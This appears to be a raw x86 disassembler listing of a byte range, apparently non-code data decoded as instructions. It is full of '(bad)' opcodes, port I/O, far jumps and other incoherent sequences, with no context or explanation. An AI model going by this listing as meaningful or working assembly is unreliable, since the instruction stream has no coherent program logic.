  4159e3:	sbb    dl,bh
  4159e5:	dec    ebx
  4159e6:	aas    
  4159e7:	(bad)  
  4159e8:	mov    ds:0x9fc32579,al
  4159ed:	ja     0x415a3c
  4159ef:	mov    eax,0x1d79db48
  4159f4:	enter  0x1561,0xf1
  4159f8:	scas   eax,DWORD PTR es:[edi]
  4159f9:	in     eax,0xef
  4159fb:	mov    esp,ebx
  4159fd:	cmp    al,0x31
  4159ff:	push   ss
  415a00:	add    esp,DWORD PTR [ebx-0x368a5746]
  415a06:	cmp    DWORD PTR [edi+0x5b],esp
  415a09:	es push edx
  415a0b:	ror    DWORD PTR [ebp+esi*2+0x69e99b55],1
  415a12:	fidivr DWORD PTR [edx]
  415a15:	cmc    
  415a16:	js     0x4159af
  415a18:	dec    ecx
  415a19:	fcomi  st,st(4)
  415a1b:	pop    ebx
  415a1c:	mov    ecx,0xf7d87f86
  415a21:	in     al,dx
  415a22:	aad    0xb9
  415a24:	push   edx
  415a25:	rol    DWORD PTR [ebx-0x76007f96],cl
  415a2b:	popf   
  415a2c:	inc    edx
  415a2d:	adc    eax,0x89fa5877
  415a32:	and    edx,DWORD PTR [eax+0x6deeaab6]
  415a38:	(bad)  ds:0x57c9da07
  415a3e:	aas    
  415a3f:	icebp  
  415a40:	mov    eax,gs
  415a42:	inc    esi
  415a43:	sbb    BYTE PTR [edx+0x42b0d2d0],ch
  415a49:	stos   BYTE PTR es:[edi],al
  415a4a:	test   DWORD PTR [esi+0x7],0xc6487b9f
  415a51:	fnstenv [ecx]
  415a53:	in     eax,0xfe
  415a55:	daa    
  415a56:	mov    ecx,0x409c252f
  415a5b:	pop    edx
  415a5c:	push   edi
  415a5d:	and    DWORD PTR [ebx+edx*2+0x257d043a],ebx
  415a64:	jns    0x415a7e
  415a66:	sub    DWORD PTR [ebp-0x72],ebx
  415a69:	dec    esi
  415a6a:	xchg   ebp,eax
  415a6b:	add    eax,0xf9f68bd9
  415a70:	sub    cl,BYTE PTR [ebx+0x30]
  415a73:	lods   eax,DWORD PTR ds:[esi]
  415a74:	bswap  ebx
  415a76:	dec    esp
  415a77:	pop    esi
  415a78:	pop    ebx
  415a7a:	cdq    
  415a7b:	inc    ebx
  415a7c:	xor    BYTE PTR [esi],0xed
  415a7f:	add    BYTE PTR ss:[ecx+0x55e8dfd2],bh
  415a86:	in     eax,dx
  415a87:	xor    al,0x53
  415a89:	pop    ss
  415a8a:	adc    BYTE PTR [esi+edi*2-0x6a],dh
  415a8e:	xchg   DWORD PTR [eax+0xbcad6bb],ecx
  415a94:	test   bh,dl
  415a96:	mov    DWORD PTR [ebp+edx*4+0x7bdbce74],0x485920a
  415aa1:	dec    ebp
  415aa2:	xor    BYTE PTR [ecx+0x5ef84bbc],bh
  415aa8:	cmp    al,0xb0
  415aaa:	div    DWORD PTR [esi]
  415aac:	adc    ebp,DWORD PTR ds:0xea0fd976
  415ab2:	cmp    esp,DWORD PTR [esi-0x24cdfe9a]
  415ab8:	adc    BYTE PTR [ecx-0xe],bl
  415abb:	xchg   BYTE PTR [esi],bh
  415abd:	sub    eax,0x4cfb347d
  415ac2:	pop    edi
  415ac3:	sub    cl,BYTE PTR [ecx]
  415ac5:	push   0xdac8f10f
  415aca:	cld    
  415acb:	or     eax,0x2d97ce06
  415ad0:	cld    
  415ad1:	xchg   ebp,eax
  415ad2:	ret    0x149c
  415ad5:	in     al,0xf9
  415ad7:	out    0xb5,eax
  415ad9:	dec    ebp
  415ada:	jl     0x415af9
  415adc:	lock lods eax,DWORD PTR ds:[esi]
  415ade:	das    
  415adf:	fsubr  DWORD PTR [ecx+0x2f]
  415ae2:	scas   eax,DWORD PTR es:[edi]
  415ae3:	jns    0x415b57
  415ae5:	xor    esi,eax
  415ae7:	push   es
  415ae8:	pop    esp
  415ae9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aeb:	xchg   edx,eax
  415aec:	(bad)  
  415aed:	call   0xd8fe:0xf6859637
  415af4:	xor    DWORD PTR [ebx],0xffffffce
  415af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415af8:	xchg   ecx,eax
  415af9:	inc    esp
  415afa:	add    al,0x5c
  415afc:	push   eax
  415afd:	bound  edi,QWORD PTR [ebp+0x2b]
  415b00:	inc    esi
  415b01:	jmp    0x415af8
  415b03:	dec    ebx
  415b04:	out    0x3f,eax
  415b06:	gs in  al,dx
  415b08:	cmp    ebx,DWORD PTR [esi+0x7d5950c5]
  415b0e:	sbb    eax,0xb26ee04f
  415b13:	loop   0x415b8a
  415b15:	pop    ebx
  415b16:	pop    ecx
  415b17:	dec    ebp
  415b18:	pop    esp
  415b19:	fucomp st(6)
  415b1b:	adc    BYTE PTR [edx-0x3640833b],0x6c
  415b22:	jg     0x415afb
  415b24:	jg     0x415b1a
  415b26:	fiadd  DWORD PTR [edi+0x8]
  415b29:	lods   eax,DWORD PTR ds:[esi]
  415b2a:	ret    
  415b2b:	int3   
  415b2c:	test   eax,0xe38c5ada
  415b31:	fisubr DWORD PTR [ebx+ecx*1]
  415b34:	add    edx,DWORD PTR [eax+0x185fc230]
  415b3a:	fs js  0x415b46
  415b3d:	xor    al,0x36
  415b3f:	sbb    al,0x66
  415b41:	adc    edi,DWORD PTR [edx-0x568e584d]
  415b47:	cmc    
  415b48:	stc    
  415b49:	and    BYTE PTR [ebp-0x1f],dl
  415b4c:	sbb    eax,DWORD PTR [edx]
  415b4e:	ficomp WORD PTR [edi+0x77]
  415b51:	sub    ebp,DWORD PTR [ecx+0x7813c7c3]
  415b57:	mov    ebx,0xca7a07db
  415b5c:	xor    bl,BYTE PTR [ecx-0x3]
  415b5f:	adc    esi,DWORD PTR [si]
  415b62:	fisttp DWORD PTR [ebp-0x31]
  415b65:	ins    DWORD PTR es:[edi],dx
  415b66:	js     0x415bbc
  415b68:	test   al,dh
  415b6a:	fdivr  QWORD PTR [edx-0x5f6e7a72]
  415b70:	ds jmp 0xbbe1:0xeff30b56
  415b78:	and    BYTE PTR [esi-0x11],0x49
  415b7c:	nop    DWORD PTR [eax+0x59]
  415b80:	cli    
  415b81:	in     eax,0xd7
  415b83:	aad    0xd
  415b85:	pop    ecx
  415b86:	adc    DWORD PTR [ecx-0x318fb9f6],eax
  415b8c:	std    
  415b8d:	mov    esp,0x547a7855
  415b92:	les    ebp,FWORD PTR [edi-0x3f]
  415b95:	fs mov bh,0x77
  415b98:	jne    0x415b51
  415b9a:	jno    0x415b75
  415b9c:	push   eax
  415b9d:	out    dx,al
  415b9e:	add    dl,BYTE PTR [esi]
  415ba0:	fwait
  415ba1:	pop    esp
  415ba2:	loopne 0x415b3f
  415ba4:	cmp    al,0xc9
  415ba6:	stc    
  415ba7:	les    ecx,FWORD PTR [ebp-0x18]
  415baa:	leave  
  415bab:	mov    edi,0x43fcc50a
  415bb0:	ins    BYTE PTR es:[edi],dx
  415bb1:	test   DWORD PTR [edi],0xba7ab0cf
  415bb7:	inc    edx
  415bb8:	dec    eax
  415bb9:	fbstp  TBYTE PTR [eax-0x66f7ec40]
  415bbf:	fidivr DWORD PTR [edi]
  415bc1:	inc    edx
  415bc2:	cmc    
  415bc3:	fisub  DWORD PTR [esi-0x3a]
  415bc6:	std    
  415bc7:	ret    
  415bc8:	sbb    bl,ch
  415bca:	sub    al,0x1
  415bcc:	mov    bl,BYTE PTR [edi+0x3b]
  415bcf:	xchg   edi,eax
  415bd0:	cmp    al,cl
  415bd2:	jecxz  0x415bae
  415bd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bd5:	jle    0x415c4e
  415bd7:	cmp    esp,esp
  415bd9:	test   al,0xe
  415bdb:	enter  0x9400,0x74
  415bdf:	pusha  
  415be0:	mov    bl,0xb6
  415be2:	jns    0x415c41
  415be4:	add    BYTE PTR [ecx+0x5c],ch
  415be7:	mov    eax,ds:0x8feac963
  415bec:	loope  0x415c4e
  415bee:	or     edx,ebx
  415bf0:	mov    cl,0x37
  415bf2:	inc    edi
  415bf3:	inc    ebx
  415bf4:	mov    edi,0x62089a8c
  415bf9:	and    edi,DWORD PTR [esi]
  415bfb:	cmp    cl,bh
  415bfd:	xchg   esp,eax
  415bfe:	sub    BYTE PTR [eax+0x72bc0e78],al
  415c04:	pop    esp
  415c05:	or     BYTE PTR [edi],ah
  415c07:	popf   
  415c08:	js     0x415c7e
  415c0a:	js     0x415c3a
  415c0c:	jg     0x415b9f
  415c0e:	test   bl,ah
  415c10:	mov    al,0x9f
  415c12:	mov    ebp,DWORD PTR [esi+0x37]
  415c15:	inc    ecx
  415c16:	jno    0x415bd3
  415c18:	xor    al,0x20
  415c1a:	or     BYTE PTR [eax-0x5a41c565],dh
  415c20:	mov    dh,0xea
  415c22:	xor    ch,bh
  415c24:	test   eax,0x226a09f0
  415c29:	cdq    
  415c2a:	add    ah,BYTE PTR [edx+0x3e]
  415c2d:	dec    ebp
  415c2e:	out    dx,eax
  415c2f:	cmc    
  415c30:	mov    edi,0x5bab6d2
  415c35:	test   al,0x47
  415c37:	daa    
  415c38:	imul   esi,ecx,0xc356e9d9
  415c3e:	dec    ecx
  415c3f:	pop    eax
  415c40:	out    0x53,eax
  415c42:	xchg   DWORD PTR [ecx+edi*2],esp
  415c45:	sub    ch,BYTE PTR [ebx+0x3176e464]
  415c4b:	sbb    ch,ch
  415c4d:	out    0x18,eax
  415c4f:	pusha  
  415c50:	fwait
  415c51:	std    
  415c52:	sbb    edi,DWORD PTR [edx-0x8c91803]
  415c58:	add    bl,ah
  415c5a:	repz imul ah
  415c5d:	push   eax
  415c5e:	xchg   ecx,eax
  415c5f:	test   ax,0x171d
  415c63:	sbb    dl,BYTE PTR [esi-0x2f6f49c4]
  415c69:	push   ebx
  415c6a:	mov    dh,0x90
  415c6c:	pop    ds
  415c6d:	fs xor eax,0xd50014c3
  415c73:	push   cs
  415c74:	std    
  415c75:	enter  0x6cd6,0xc1
  415c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c7a:	pusha  
  415c7b:	fsubr  QWORD PTR [eax-0x7f]
  415c7e:	leave  
  415c7f:	sub    eax,0x6427d772
  415c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c85:	sbb    eax,0xde7a513c
  415c8a:	push   cs
  415c8b:	into   
  415c8c:	cdq    
  415c8d:	sub    ch,0xfe
  415c90:	jg     0x415cf9
  415c92:	mov    esi,0x500a13
  415c97:	idiv   DWORD PTR [edx-0x4b744b04]
  415c9d:	sar    DWORD PTR ds:0x1ee92018,cl
  415ca3:	push   cs
  415ca4:	jg     0x415cf2
  415ca6:	jns    0x415d20
  415ca8:	pop    eax
  415ca9:	repnz sub DWORD PTR [ebx],ebx
  415cac:	mov    bl,0xd6
  415cae:	loope  0x415ce8
  415cb0:	(bad)  
  415cb1:	aad    0xa0
  415cb3:	data16 mov bl,0x1e
  415cb6:	push   esp
  415cb7:	test   DWORD PTR [esi+edx*2],ecx
  415cba:	call   0x9228:0x4aebc2c7
  415cc1:	aam    0xcf
  415cc3:	dec    edx
  415cc4:	add    eax,DWORD PTR [edi-0x41]
  415cc7:	icebp  
  415cc8:	push   cs
  415cc9:	push   0x481302b1
  415cce:	adc    BYTE PTR ss:[eax-0x232c2a3c],ch
  415cd5:	fbld   TBYTE PTR [eax+ecx*2+0x4fa23dd]
  415cdc:	sub    eax,0xa27e2166
  415ce1:	add    DWORD PTR [ebx+0x75705b3b],esi
  415ce7:	cmp    BYTE PTR [edx],dh
  415ce9:	retf   0xe0e4
  415cec:	gs mov ch,0x15
  415cef:	call   0x7e6a:0x21c68f01
  415cf6:	push   esp
  415cf7:	lahf   
  415cf8:	out    0x4c,eax
  415cfa:	call   0x1955bdf0
  415cff:	pop    ss
  415d00:	dec    esi
  415d01:	into   
  415d02:	fcomip st,st(2)
  415d04:	adc    BYTE PTR [eax-0x5b],cl
  415d07:	neg    DWORD PTR [ebx]
  415d09:	cmc    
  415d0a:	mov    dl,0xfc
  415d0c:	mov    eax,0x2b52eaa9
  415d11:	ins    DWORD PTR es:[edi],dx
  415d12:	ret    0x937a
  415d15:	xchg   ebx,eax
  415d16:	and    esp,DWORD PTR [ebx+eiz*4-0x7c]
  415d1a:	mov    al,ds:0x20b123ed
  415d1f:	mov    al,ds:0xbbcb6b53
  415d24:	push   ebx
  415d25:	rol    DWORD PTR [edi-0x3d],cl
  415d28:	pop    esi
  415d29:	and    bh,BYTE PTR [ecx+0x10aeb939]
  415d2f:	mov    al,0x85
  415d31:	jns    0x415cff
  415d33:	ficomp WORD PTR [ebp+esi*8+0x5c69e0af]
  415d3a:	psubusw mm2,QWORD PTR [edi+0x75184fbf]
  415d41:	icebp  
  415d42:	cs stc 
  415d44:	cld    
  415d45:	ror    BYTE PTR [ebx-0xb],1
  415d48:	mov    ecx,0x316023b7
  415d4d:	jno    0x415cfd
  415d4f:	xchg   esp,eax
  415d50:	cmp    edi,DWORD PTR [eax-0x66]
  415d53:	dec    ebx
  415d54:	adc    al,ch
  415d56:	inc    edi
  415d57:	cld    
  415d58:	adc    DWORD PTR [eax],ebx
  415d5a:	lods   eax,DWORD PTR ds:[esi]
  415d5b:	mov    cl,0xa8
  415d5d:	lock cmp BYTE PTR [ebx+edx*8-0x48],dh
  415d62:	and    eax,0xabbaaa20
  415d67:	repnz in al,0x6
  415d6a:	popa   
  415d6b:	scas   eax,DWORD PTR es:[edi]
  415d6c:	push   0x1136c6e5
  415d71:	ficom  WORD PTR [edx+0x3d]
  415d74:	dec    edx
  415d75:	daa    
  415d76:	dec    ecx
  415d77:	inc    edx
  415d78:	jbe    0x415d6f
  415d7a:	push   eax
  415d7b:	cli    
  415d7c:	sbb    eax,0x3ccb2843
  415d81:	loope  0x415d5e
  415d83:	iret   
  415d84:	mov    ds:0x99de0c50,eax
  415d89:	mov    bh,0x6c
  415d8b:	cmp    dl,BYTE PTR [esi]
  415d8d:	sbb    ecx,ebx
  415d8f:	sub    al,0xab
  415d91:	inc    esi
  415d92:	dec    esp
  415d93:	dec    esp
  415d94:	ret    0xe951
  415d97:	leave  
  415d98:	mov    al,0xae
  415d9a:	or     al,0x18
  415d9c:	loope  0x415d78
  415d9e:	jg     0x415dde
  415da0:	add    esi,ecx
  415da2:	lods   al,BYTE PTR ds:[esi]
  415da3:	xor    BYTE PTR [eax-0x28],0xf9
  415da7:	(bad)  
  415da8:	xlat   BYTE PTR ds:[ebx]
  415da9:	or     eax,0x980cc044
  415dae:	mov    edx,0x5160eecf
  415db3:	mov    edx,0x61192ea4
  415db8:	sub    bh,BYTE PTR [eax]
  415dba:	push   cs
  415dbb:	fisub  DWORD PTR [ecx]
  415dbd:	mov    bh,0xc9
  415dbf:	pop    ss
  415dc0:	pop    ss
  415dc1:	inc    esi
  415dc2:	sub    DWORD PTR [esi],esi
  415dc4:	xchg   edx,eax
  415dc5:	push   ds
  415dc6:	cwde   
  415dc7:	daa    
  415dc8:	sbb    DWORD PTR [edi],edx
  415dca:	sbb    ecx,DWORD PTR [ecx+0x31c4a210]
  415dd0:	fst    DWORD PTR [edx]
  415dd2:	(bad)  
  415dd3:	jbe    0x415db8
  415dd5:	sub    dh,BYTE PTR [edi+0x698dc259]
  415ddb:	in     al,0x2f
  415ddd:	mov    bl,0x7b
  415ddf:	fwait
  415de0:	ss push ecx
  415de2:	inc    edx
  415de3:	daa    
  415de4:	cli    
  415de5:	or     ch,bl
  415de7:	mov    edx,DWORD PTR [ecx]
  415de9:	iret   
  415dea:	or     eax,0xd7d545d9
  415def:	adc    al,0x7a
  415df1:	test   ah,ch
  415df3:	sub    al,0x70
  415df5:	push   ebp
  415df6:	cwde   
  415df7:	fidivr DWORD PTR [esi*1-0x7b7a958d]
  415dfe:	int    0xd7
  415e00:	mov    dh,0x6b
  415e02:	sub    DWORD PTR [edx+0x78],0xb8e11f56
  415e09:	int    0xf8
  415e0b:	dec    ebx
  415e0c:	push   0x72
  415e0e:	adc    BYTE PTR ds:0x3f6497ba,al
  415e14:	les    edx,FWORD PTR [eax+eiz*4]
  415e17:	(bad)  
  415e18:	imul   ebx,DWORD PTR [ebp+ecx*4-0x4c],0xffffff9f
  415e1d:	ss pop ds
  415e1f:	div    bh
  415e21:	mov    DWORD PTR ds:0x83f861f4,ecx
  415e27:	iret   
  415e28:	je     0x415e25
  415e2a:	inc    edi
  415e2b:	push   cs
  415e2c:	ror    BYTE PTR [edi-0x1f],0x16
  415e30:	xor    DWORD PTR [esi-0x71265d29],esi
  415e36:	jnp    0x415e6a
  415e38:	dec    edi
  415e39:	jb     0x415dfe
  415e3b:	aas    
  415e3c:	mov    cl,0x49
  415e3e:	jmp    0xff3c:0x37e7f237
  415e45:	lahf   
  415e46:	mov    ch,0x79
  415e48:	sbb    al,0x8e
  415e4a:	ss aam 0x87
  415e4d:	xchg   esi,eax
  415e4e:	mov    al,0xba
  415e50:	int    0x2
  415e52:	sbb    dl,BYTE PTR [edx]
  415e54:	js     0x415e96
  415e56:	pop    ds
  415e57:	inc    esp
  415e58:	fist   WORD PTR [edi-0x7dc73191]
  415e5e:	xor    ebp,edi
  415e60:	inc    ebx
  415e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e62:	jp     0x415e8b
  415e64:	and    al,0x12
  415e66:	lods   al,BYTE PTR ds:[esi]
  415e67:	iret   
  415e68:	fimul  WORD PTR [edi-0x5ebb24b1]
  415e6e:	stos   DWORD PTR es:[edi],eax
  415e6f:	inc    ebp
  415e70:	out    dx,al
  415e71:	cmp    dh,bh
  415e73:	in     al,dx
  415e74:	retf   0x1927
  415e77:	pop    edi
  415e78:	cwde   
  415e79:	frstor [esi+0x68]
  415e7c:	pop    edi
  415e7d:	iret   
  415e7e:	sti    
  415e7f:	push   ebp
  415e80:	pop    esp
  415e81:	loope  0x415e04
  415e83:	rol    DWORD PTR [edi+0x2216fe7a],cl
  415e89:	lea    esi,[eax+eax*8-0x308cab0f]
  415e90:	pop    ecx
  415e91:	pop    esp
  415e92:	push   ds
  415e93:	inc    esp
  415e94:	xor    dh,BYTE PTR [eax-0x68]
  415e97:	jo     0x415e9b
  415e99:	mov    dh,0xb7
  415e9b:	dec    edi
  415e9c:	jge    0x415e4c
  415e9e:	dec    esp
  415e9f:	xor    DWORD PTR [ebp-0x4fa66663],edx
  415ea5:	or     al,0x38
  415ea7:	inc    ebx
  415ea8:	inc    ecx
  415ea9:	shl    BYTE PTR [eax],1
  415eab:	push   ebp
  415eac:	or     cl,BYTE PTR [ecx-0x3b]
  415eaf:	jnp    0x415ed5
  415eb1:	push   ds
  415eb2:	repnz cmp DWORD PTR [eax],0x82144509
  415eb9:	mov    esi,0xe6f71fe9
  415ebe:	inc    ebx
  415ebf:	js     0x415f38
  415ec1:	scas   eax,DWORD PTR es:[edi]
  415ec2:	or     ebp,DWORD PTR [esi]
  415ec4:	cmp    edi,ebx
  415ec6:	jmp    0xa0f9:0xb37b466b
  415ecd:	repz dec ebx
  415ecf:	dec    ecx
  415ed0:	test   al,0x10
  415ed2:	adc    ecx,DWORD PTR [edi+0x4964d333]
  415ed8:	xchg   ebp,eax
  415ed9:	or     al,0x35
  415edb:	lods   al,BYTE PTR ds:[esi]
  415edc:	sub    al,BYTE PTR [ebx]
  415ede:	lea    esp,[ecx-0x23]
  415ee1:	fadd   QWORD PTR [esi+eax*4]
  415ee4:	lea    esi,[ebx-0x5d]
  415ee7:	std    
  415ee8:	mov    ch,0xc0
  415eea:	jg     0x415f1f
  415eec:	vpsubsb ymm5,ymm2,YMMWORD PTR [edx+0x1a]
  415ef1:	and    eax,0x35f169dc
  415ef6:	rcl    esp,1
  415ef8:	mov    ebp,0xcd081778
  415efd:	inc    edx
  415efe:	out    0x22,eax
  415f00:	jb     0x415f71
  415f02:	les    ebx,FWORD PTR [edx+edx*8+0x6144b0c5]
  415f09:	push   edi
  415f0a:	push   ecx
  415f0b:	pop    esi
  415f0c:	push   ebx
  415f0d:	loope  0x415ea6
  415f0f:	pop    esi
  415f10:	(bad)  
  415f11:	add    eax,0x392b7eb0
  415f16:	xor    DWORD PTR [edi+0x66100073],eax
  415f1c:	inc    edx
  415f1d:	mov    al,ds:0xe2c652f
  415f22:	inc    edi
  415f23:	xchg   edx,eax
  415f24:	or     BYTE PTR [edx-0x4a],dh
  415f27:	jno    0x415f15
  415f29:	(bad)  
  415f2a:	cwde   
  415f2b:	xchg   esp,ebp
  415f2d:	mov    eax,DWORD PTR [esi]
  415f2f:	pop    ecx
  415f30:	xchg   esp,eax
  415f31:	sub    al,0x46
  415f33:	adc    ch,BYTE PTR [eax-0x1e6ef5ed]
  415f39:	and    al,bh
  415f3b:	out    0x2d,al
  415f3d:	dec    ebx
  415f3e:	mov    ch,0x91
  415f40:	xor    al,0x4b
  415f42:	outs   dx,BYTE PTR ds:[esi]
  415f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f44:	es dec ecx
  415f46:	add    edx,DWORD PTR [ecx+eax*2]
  415f49:	push   edi
  415f4a:	ja     0x415f0a
  415f4c:	push   cs
  415f4d:	sbb    dl,BYTE PTR [edx-0x4b7b2abe]
  415f53:	sub    DWORD PTR [ebx],ebx
  415f55:	inc    esi
  415f56:	mov    cl,0x9e
  415f58:	mov    eax,es
  415f5a:	xchg   esi,eax
  415f5b:	gs aad 0xda
  415f5e:	mov    ch,0xc6
  415f60:	sar    DWORD PTR [edi],0x6f
  415f63:	pop    eax
  415f64:	loope  0x415f9e
  415f66:	mov    al,0xc9
  415f68:	int3   
  415f69:	sahf   
  415f6a:	pop    ds
  415f6b:	addr16 (bad) 
  415f6d:	repz daa 
  415f6f:	dec    eax
  415f70:	push   ecx
  415f71:	stos   BYTE PTR es:[edi],al
  415f72:	ret    
  415f73:	ja     0x415f6e
  415f75:	inc    ebp
  415f76:	addr16 pushf 
  415f78:	mov    ecx,0x781b69e9
  415f7d:	xchg   ebx,eax
  415f7e:	cwde   
  415f7f:	jns    0x415f9e
  415f81:	xor    BYTE PTR [ebx+ebp*2],dh
  415f84:	adc    eax,ecx
  415f86:	cmp    ecx,DWORD PTR [ebp-0x47]
  415f89:	sub    BYTE PTR [eax+0x6c08ef67],bh
  415f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f90:	cmp    dh,BYTE PTR [edi+0x6c]
  415f93:	imul   edx,eax,0x74
  415f96:	sbb    edi,esp
  415f98:	push   ebp
  415f99:	aad    0x6b
  415f9b:	icebp  
  415f9c:	fcmovnbe st,st(5)
  415f9e:	sbb    DWORD PTR [esi+ecx*8-0x18d11c7d],ebp
  415fa5:	ret    
  415fa6:	(bad)  
  415fa7:	mov    cl,0xa0
  415fa9:	pop    esp
  415faa:	ja     0x415fa4
  415fac:	shr    ebx,0xcd
  415faf:	xor    eax,0x45cb1504
  415fb4:	add    dh,BYTE PTR [esi+0x3b3de347]
  415fba:	and    bl,BYTE PTR [eax-0x74caa918]
  415fc0:	stos   BYTE PTR es:[edi],al
  415fc1:	push   eax
  415fc2:	inc    ecx
  415fc3:	jbe    0x415ffc
  415fc5:	loopne 0x415f47
  415fc7:	bound  ebx,QWORD PTR [esi+0x3aa028f4]
  415fcd:	mov    dl,0xcd
  415fcf:	pop    esp
  415fd0:	jbe    0x415f62
  415fd2:	and    cl,BYTE PTR [edx+0x51d4c47a]
  415fd8:	push   esi
  415fd9:	push   0x2e
  415fdb:	xor    ebx,DWORD PTR [eax+0x4729709a]
  415fe1:	in     eax,dx
  415fe2:	xchg   ebx,eax
  415fe3:	dec    esi
  415fe4:	xlat   BYTE PTR ds:[ebx]
  415fe5:	adc    ebx,DWORD PTR [edx+0x42]
  415fe8:	mov    ds:0x8bd2623b,eax
  415fed:	lahf   
  415fee:	sar    BYTE PTR fs:[ecx],0xea
  415ff2:	push   es
  415ff3:	call   0x6362dd
  415ff8:	icebp  
  415ff9:	push   0xffbc8f70
  415ffe:	mov    ah,BYTE PTR [eax]
  416000:	mov    dh,0x2e
  416002:	ror    ch,0xe
  416005:	dec    ebp
  416006:	inc    edx
  416007:	push   cs
  416008:	lods   eax,DWORD PTR gs:[esi]
  41600a:	leave  
  41600b:	mov    ds:0x65ceb90f,al
  416010:	mov    al,0x72
  416012:	in     al,dx
  416013:	sub    eax,DWORD PTR [ebp-0x2e2928f5]
  416019:	stos   BYTE PTR es:[edi],al
  41601a:	xchg   esi,eax
  41601b:	dec    ebx
  41601c:	jl     0x416045
  41601e:	and    eax,0x822b2b3a
  416023:	or     ecx,ecx
  416025:	cld    
  416026:	fdivrp st(2),st
  416028:	mov    ah,0x1b
  41602a:	jne    0x415fe9
  41602c:	and    BYTE PTR [edi],al
  41602e:	mov    esi,eax
  416030:	mov    ebx,0x56cc49a6
  416035:	push   cs
  416036:	rep lods al,BYTE PTR ds:[esi]
  416038:	pop    ebp
  416039:	popf   
  41603a:	jl     0x416075
  41603c:	xchg   esi,eax
  41603d:	xchg   edx,eax
  41603e:	xchg   ebp,eax
  41603f:	out    dx,eax
  416040:	std    
  416041:	pushf  
  416042:	lods   al,BYTE PTR ds:[esi]
  416043:	push   ebx
  416044:	out    dx,eax
  416045:	xor    BYTE PTR [eax],bh
  416047:	in     al,0x8f
  416049:	mov    dl,0x4e
  41604b:	push   ecx
  41604c:	jb     0x4160a2
  41604e:	xor    al,0xc1
  416050:	inc    esi
  416051:	cmp    edi,ebp
  416053:	mov    ebp,0x7f4292bd
  416058:	mov    ebx,0x1b0e6f5a
  41605d:	and    bl,cl
  41605f:	cmp    al,0x34
  416061:	and    BYTE PTR [edi-0x76],ch
  416064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416065:	lea    ebp,[esi+0x102d06b9]
  41606b:	xchg   esp,eax
  41606c:	scas   eax,DWORD PTR es:[edi]
  41606d:	repz mov es,WORD PTR [eax-0x39]
  416071:	sbb    al,dh
  416073:	popf   
  416074:	clc    
  416075:	and    DWORD PTR [ecx-0x4022bfe6],eax
  41607b:	rcr    DWORD PTR [ecx],0xa8
  41607e:	xor    eax,0x4e2d5f61
  416083:	mov    al,0xe9
  416085:	mov    eax,0x8e5cf844
  41608a:	retf   
  41608b:	inc    eax
  41608c:	xor    ecx,DWORD PTR [ebx-0x25]
  41608f:	cmc    
  416090:	and    BYTE PTR [ebx+0x22c02ee4],cl
  416096:	push   ebx
  416097:	xor    eax,DWORD PTR [esi-0x5]
  41609a:	and    BYTE PTR [eax-0x3dd177ea],dh
  4160a0:	retf   0x2cb4
  4160a3:	jnp    0x416120
  4160a5:	retf   
  4160a6:	in     eax,dx
  4160a7:	das    
  4160a8:	cmovnp eax,DWORD PTR [eax-0x2df90608]
  4160af:	int3   
  4160b0:	lahf   
  4160b1:	mov    dl,0x2d
  4160b3:	jb     0x4160ff
  4160b5:	cdq    
  4160b6:	ror    BYTE PTR [edi],1
  4160b8:	test   DWORD PTR [ecx+0x473a9603],eax
  4160be:	lock dec edx
  4160c0:	and    eax,0x96bc3493
  4160c5:	pushf  
  4160c6:	jmp    0x4160f3
  4160c8:	sahf   
  4160c9:	retf   
  4160ca:	sub    eax,0xa235ef3a
  4160cf:	jbe    0x4160bb
  4160d1:	adc    eax,0xba51edc0
  4160d6:	xor    BYTE PTR [esi+0x47],cl
  4160d9:	push   ebx
  4160da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160db:	in     eax,dx
  4160dc:	sahf   
  4160dd:	push   es
  4160de:	and    eax,esp
  4160e0:	or     BYTE PTR [esi],0xa6
  4160e3:	mov    al,0x99
  4160e5:	jno    0x4160d6
  4160e7:	sub    BYTE PTR [edx-0x5d],al
  4160ea:	pusha  
  4160eb:	ficomp DWORD PTR [eax-0x19d8449f]
  4160f1:	out    dx,al
  4160f2:	outs   dx,DWORD PTR ds:[esi]
  4160f3:	daa    
  4160f4:	dec    esi
  4160f5:	mov    dl,0x62
  4160f7:	daa    
  4160f8:	ins    DWORD PTR es:[edi],dx
  4160f9:	cdq    
  4160fa:	mov    al,ds:0xa97fa963
  4160ff:	jno    0x4160e0
  416101:	hlt    
  416102:	dec    esi
  416103:	test   esp,0xa086625a
  416109:	cdq    
  41610a:	inc    eax
  41610b:	mov    bh,0x33
  41610d:	cmp    edx,DWORD PTR [edx]
  41610f:	cmovnp ebx,DWORD PTR [edx+0x2f]
  416113:	stos   BYTE PTR es:[edi],al
  416114:	jmp    0x4160c9
  416116:	loopne 0x4160a7
  416118:	push   0xc309b69a
  41611d:	inc    ecx
  41611e:	inc    ebx
  41611f:	xchg   ecx,eax
  416120:	lock cdq 
  416122:	aaa    
  416123:	mov    ch,0x16
  416125:	xor    dh,al
  416127:	mov    al,0xcb
  416129:	cs dec ebx
  41612b:	sub    esp,ebx
  41612d:	scas   al,BYTE PTR es:[edi]
  41612e:	mov    DWORD PTR [eax+esi*2-0x47],eax
  416132:	(bad)  
  416133:	cmp    eax,0x64791a5b
  416138:	cwde   
  416139:	xor    dh,BYTE PTR [esi-0x4296e426]
  41613f:	mov    ds:0x8cbe5a54,eax
  416144:	jae    0x416180
  416146:	or     BYTE PTR cs:[edx-0x20],ah
  41614a:	mov    ecx,0xd494b295
  41614f:	not    al
  416151:	xchg   BYTE PTR [edi*1+0x59684d65],dh
  416158:	add    dl,BYTE PTR ds:0xb1cac8af
  41615e:	retf   
  41615f:	(bad)  
  416160:	inc    eax
  416161:	outs   dx,DWORD PTR ds:[esi]
  416162:	jecxz  0x41610d
  416164:	or     al,0x32
  416166:	mov    edi,DWORD PTR [esi+0x6b27100f]
  41616c:	ins    DWORD PTR es:[edi],dx
  41616d:	or     edx,DWORD PTR [eax-0x256f2d55]
  416173:	js     0x4160f8
  416175:	imul   DWORD PTR [edi]
  416177:	not    BYTE PTR [ecx]
  416179:	or     ebp,esp
